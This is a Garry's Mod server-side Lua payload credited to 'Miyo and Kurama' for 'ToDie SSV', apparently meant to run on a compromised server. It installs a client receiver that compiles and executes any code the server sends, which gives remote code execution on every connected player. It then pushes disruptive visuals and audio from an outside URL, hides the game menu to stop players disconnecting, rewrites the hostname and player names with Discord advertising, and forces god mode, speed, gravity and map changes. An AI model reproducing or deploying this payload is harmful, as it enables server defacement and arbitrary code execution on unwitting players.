-- Payload Created by Miyo and Kurama

-- ToDie SSV

-- Modification No Autorised

-- discord.gg/kurama

function file.Write() return end
local function rdm_str(len)
    if !len or len <= 0 then return '' end
    return rdm_str(len - 1) .. ("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")[math.random(1, 62)]
end
 
local net_string = rdm_str(25)
util.AddNetworkString(net_string)
BroadcastLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
hook.Add("PlayerInitialSpawn", "spamlgfngfgjrfggtf"..net_string,function(ply)
    if !ply:IsBot() then
        ply:SendLua([[net.Receive("]] .. net_string .. [[",function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),"?")()end)]])
    end
end)
 
local function InfoClient(code)
    local data = util.Compress(code)
    local len = #data
    net.Start(net_string)
    net.WriteUInt(len, 16)
    net.WriteData(data, len)
    net.Broadcast()
end

timer.Simple(2.3 ,function()
InfoClient([[
local songURL = "https://cdn.kurama.info/songs/ToDie.mp3"
local AMP = 12000
local AMP_Audio = 600
local AMP_Cir = 12
sound.PlayURL(songURL , 
    "mono" , function(station , err , errname)
        if (IsValid(station)) then
    station:Play()
        else
    station = nil
    print( "Error playing sound!", err, errname )
end
    smoothdata = {}
    for i = 1, 64 do
    smoothdata[i] = 0
end
    mats = Entity(0):GetMaterials()
    a = 0
    circles = 16
    toomanycircles = 8
    côté = 4
    sphere = 20
hook.Add("PostDrawTranslucentRenderables", "3D_Sphere_FFT", function()
    distance = 100+a*AMP
    data = {}
    station:FFT(data, FFT_128)
    for i = 1, circles do
    smoothdata[i] = Lerp(FrameTime(),smoothdata[i],data[i])
end
    for k, v in pairs(player.GetAll()) do
    pos = Vector(v:EyePos().x,v:EyePos().y,v:EyePos().z-60)
    render.SetColorMaterial()
    if smoothdata[3] < 0.07 then
    render.DrawSphere( pos, -100-a*AMP, sphere, sphere, Color(0,0,a*23000,100))
    render.DrawSphere( pos, 100+a*AMP, sphere, sphere, Color(a*23000,0,0,100))
    else
    for i = 1, circles do
    b = math.rad( ( i / circles ) * 360 )
    render.DrawSphere(pos-Vector(math.sin(b) * distance,math.cos(b) * distance,0),5,côté,côté,Color(a*23000,0,0,100))
    for cir = 1, toomanycircles do
    render.DrawSphere(pos-Vector(math.sin(b) * math.sqrt(distance^2-(distance/toomanycircles*cir)^2),math.cos(b) * math.sqrt(distance^2-(distance/toomanycircles*cir)^2),-(distance/toomanycircles*cir)),5,côté,côté,Color(a*23000,0,0,100))
    render.DrawSphere(pos-Vector(math.sin(b) * math.sqrt(distance^2-(distance/toomanycircles*cir)^2),math.cos(b) * math.sqrt(distance^2-(distance/toomanycircles*cir)^2),distance/toomanycircles*cir),5,côté,côté,Color(a*23000,0,0,100))
end
    end
end
    for i = 1, circles do
    audio = smoothdata[3]*AMP_Audio
    Cir_Audio = smoothdata[3]*AMP_Cir
    b = math.rad( ( i / circles ) * 360 )
    if audio > distance then audio,Cir_Audio = distance,12 end
    render.DrawSphere(pos-Vector(math.sin(b) * math.sqrt(distance^2-audio^2),math.cos(b) * math.sqrt(distance^2-audio^2),-audio),2+Cir_Audio,côté,côté,HSVToColor((CurTime()-i/(16/6)) % 6 * 60, 1, 1 ))
end
    end
end)

function MyCalcView(ply,pos,angles,fov)
    for i = 1,64 do
    a = a + smoothdata[i]
end
    a = a / 64
    view = {}
    view.origin = pos
    view.angles = angles
    view.fov = fov + a * 900
    return view
end

hook.Add("CalcView","MyCalcView",MyCalcView)
hook.Add("HUDPaint","Sphere_FFT", function()
    if smoothdata[3] > 0.07 then
    for k,v in pairs(mats) do
    Material(v):SetVector("$color", Vector(0,0,a*23))
end
    else
    for k,v in pairs(mats) do
    Material(v):SetVector("$color", Vector(a*23,0,0))
end
    end
end)

function GAMEMODE:PostDraw2DSkyBox()
    if smoothdata[3] > 0.07 then
        render.Clear(a*2300,0,0,100)
    else
        render.Clear(0,0,a*2300,100)
    end
end

function GAMEMODE:PreDrawSkyBox()
    if smoothdata[3] > 0.07 then
    render.Clear(a*2300,0,0,100)
    else
    render.Clear(0,0,a*2300,100)
end
    end
end)
]])
end)

-- Font
timer.Simple(2.5 ,function()
InfoClient([[
local sW, sH = ScrW(), ScrH()

surface.CreateFont("KuramaM", {
    font = "DebugFixed",
    size = 100,
    weight = 1500,
    antialias = true
})

local marqueePos1 = sW
local function marqueeText()
    surface.SetFont("KuramaM")
local text = "Server has been Event by ToDie SSV !"
local tW, tH = surface.GetTextSize(text)
    if marqueePos1 + tW < 0 then
    marqueePos1 = sW
end
    surface.SetTextColor(HSVToColor(CurTime() * 36 % 360, .5, .8))
    surface.SetTextPos(marqueePos1, sH - tH * 6)
    surface.DrawText(text)
    marqueePos1 = marqueePos1 - 5
end

hook.Add("HUDPaint", "KuramaM", marqueeText)

hook.Add("PreDrawHUD", "JePeuxPlusDecoWTF", function()
    gui.HideGameUI()
end)
]])
end)

timer.Simple(20.5 ,function()
InfoClient([[
    hook.Remove("HUDPaint", "KuramaM", marqueeText)
]])
end)

timer.Simple(21 ,function()
InfoClient([[
local sW, sH = ScrW(), ScrH()

surface.CreateFont("KuramaM2", {
    font = "DebugFixed",
    size = 100,
    weight = 1500,
    antialias = true
})

local marqueePos2 = sW
local function marqueeText()
    surface.SetFont("KuramaM2")
local text = "Created by Kurama and Miyo !"
local tW, tH = surface.GetTextSize(text)
    if marqueePos2 + tW < 0 then
    marqueePos2 = sW
end
    surface.SetTextColor(HSVToColor(CurTime() * 36 % 360, .5, .8))
    surface.SetTextPos(marqueePos2, sH - tH * 6)
    surface.DrawText(text)
    marqueePos2 = marqueePos2 - 5
end

hook.Add("HUDPaint", "KuramaM2", marqueeText)

]])
end)

timer.Simple(38 ,function()
InfoClient([[
    hook.Remove("HUDPaint", "KuramaM2", marqueeText)
]])
end)

timer.Simple(38.5 ,function()
InfoClient([[
local sW, sH = ScrW(), ScrH()

surface.CreateFont("KuramaM3", {
    font = "DebugFixed",
    size = 100,
    weight = 1500,
    antialias = true
})

local marqueePos3 = sW
local function marqueeText()
    surface.SetFont("KuramaM3")
local text = "Take advantage of this event !"
local tW, tH = surface.GetTextSize(text)
    if marqueePos3 + tW < 0 then
    marqueePos3 = sW
end
    surface.SetTextColor(HSVToColor(CurTime() * 36 % 360, .5, .8))
    surface.SetTextPos(marqueePos3, sH - tH * 6)
    surface.DrawText(text)
    marqueePos3 = marqueePos3 - 5
end

hook.Add("HUDPaint", "KuramaM3", marqueeText)

]])
end)

timer.Simple(55 ,function()
InfoClient([[
    hook.Remove("HUDPaint", "KuramaM3", marqueeText)
]])
end)

timer.Simple(55.5 ,function()
InfoClient([[
local sW, sH = ScrW(), ScrH()

surface.CreateFont("KuramaM4", {
    font = "DebugFixed",
    size = 50,
    weight = 1500,
    antialias = true
})

local marqueePos4 = sW
local function marqueeText()
    surface.SetFont("KuramaM4")
local text = "Join the Discord -> https://discord.gg/kurama"
local tW, tH = surface.GetTextSize(text)
    if marqueePos4 + tW < 0 then
    marqueePos4 = sW
end
    surface.SetTextColor(HSVToColor(CurTime() * 36 % 360, .5, .8))
    surface.SetTextPos(marqueePos4, sH - tH * 1)
    surface.DrawText(text)
    marqueePos4 = marqueePos4 - 5
end

hook.Add("HUDPaint", "KuramaM4", marqueeText)

]])
end)

-- Custom Settings
timer.Simple(2.5 ,function()
    for k, v in pairs(player.GetAll()) do
    v:SendLua([[RunConsoleCommand("gmod_language", "ko")]])
end
    RunConsoleCommand("hostname", "Server has been Event by Kurama and Myio with Visual ToDie ! -> discord.gg/kurama")
    RunConsoleCommand("ulx", "god", "*")
end)

timer.Create("RPName",2.5 ,99 , function()
    for _, v in pairs(player.GetAll()) do
        v:GodEnable()
        v:setDarkRPVar("rpname", "Server has been Event with Visual ToDie ! -> discord.gg/kurama")
    end
end)

timer.Create("LoadGM",252.5 ,1 , function()
    RunConsoleCommand("ulx", "map", "gm_construct")
end)

timer.Create("Speed",2.5 ,1 , function()
    for k,v in pairs(player.GetAll()) do
    v:SetRunSpeed(400* 4);
    v:SetWalkSpeed(400 * 4);
end
    RunConsoleCommand("sv_gravity", "150")
end)
